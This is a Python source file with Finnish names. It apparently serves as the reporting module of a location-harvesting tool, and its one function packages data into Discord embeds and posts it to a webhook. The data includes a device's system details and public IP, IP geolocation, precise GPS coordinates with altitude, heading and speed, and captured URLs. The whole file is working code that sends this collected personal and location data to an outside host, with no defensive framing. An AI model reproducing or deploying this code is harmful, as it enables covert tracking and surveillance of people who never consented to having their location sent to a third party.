#!/usr/bin/env python3

import requests
from json import dumps, loads


def discord_lähettäjä(url, msg_tyyppi, sisältö):
    json_str = dumps(sisältö)
    json_sisältö = loads(json_str)
    
    if msg_tyyppi == 'laitetiedot':
        info_viesti = {
            "content": None,
            "embeds": [
                {
                    "title": "Laitetiedot",
                    "color": 65280,
                    "fields": [
                        {
                            "name": "Käyttöjärjestelmä",
                            "value": json_sisältö['os']
                        },
                        {
                            "name": "Alusta",
                            "value": json_sisältö['platform']
                        },
                        {
                            "name": "Selaimet",
                            "value": json_sisältö['browser']
                        },
                        {
                            "name": "GPU-valmistaja",
                            "value": json_sisältö['vendor']
                        },
                        {
                            "name": "GPU",
                            "value": json_sisältö['render']
                        },
                        {
                            "name": "CPU-ytimiä",
                            "value": json_sisältö['cores']
                        },
                        {
                            "name": "RAM",
                            "value": json_sisältö['ram']
                        },
                        {
                            "name": "Julkinen IP",
                            "value": json_sisältö['ip']
                        },
                        {
                            "name": "Resoluutio",
                            "value": f'{json_sisältö["ht"]}x{json_sisältö["wd"]}'
                        }
                    ]
                }
            ]
        }
        requests.post(url, json=info_viesti, timeout=10)

    if msg_tyyppi == 'ip_tiedot':
        ip_tiedot_viesti = {
            "content": None,
            "embeds": [
                {
                    "title": "IP-tiedot",
                    "color": 65280,
                    "fields": [
                        {
                            "name": "Manner",
                            "value": json_sisältö['continent']
                        },
                        {
                            "name": "Maa",
                            "value": json_sisältö['country']
                        },
                        {
                            "name": "Alue",
                            "value": json_sisältö['region']
                        },
                        {
                            "name": "Kaupunki",
                            "value": json_sisältö['city']
                        },
                        {
                            "name": "Organisaatio",
                            "value": json_sisältö['org']
                        },
                        {
                            "name": "ISP",
                            "value": json_sisältö['isp']
                        }
                    ]
                }
            ]
        }
        requests.post(url, json=ip_tiedot_viesti, timeout=10)

    if msg_tyyppi == 'sijainti':
        sijainti_viesti = {
            "content": None,
            "embeds": [
                {
                    "title": "Sijaintitiedot",
                    "color": 65280,
                    "fields": [
                        {
                            "name": "Leveysaste",
                            "value": json_sisältö['lat']
                        },
                        {
                            "name": "Pituusaste",
                            "value": json_sisältö['lon']
                        },
                        {
                            "name": "Tarkkuus",
                            "value": json_sisältö['acc']
                        },
                        {
                            "name": "Korkeus",
                            "value": json_sisältö['alt']
                        },
                        {
                            "name": "Suunta",
                            "value": json_sisältö['dir']
                        },
                        {
                            "name": "Nopeus",
                            "value": json_sisältö['spd']
                        }
                    ]
                }
            ]
        }
        requests.post(url, json=sijainti_viesti, timeout=10)

    if msg_tyyppi == 'url':
        url_viesti = {
            "content": json_sisältö['url'],
            "embeds": None,
            "attachments": []
        }
        requests.post(url, json=url_viesti, timeout=10)

    if msg_tyyppi == 'virhe':
        virhe_viesti = {
            "content": None,
            "embeds": [
                {
                    "color": 16711680,
                    "fields": [
                        {
                            "name": "Virhe",
                            "value": json_sisältö['errorit']
                        }
                    ]
                }
            ],
            "attachments": []
        }
        requests.post(url, json=virhe_viesti, timeout=10)
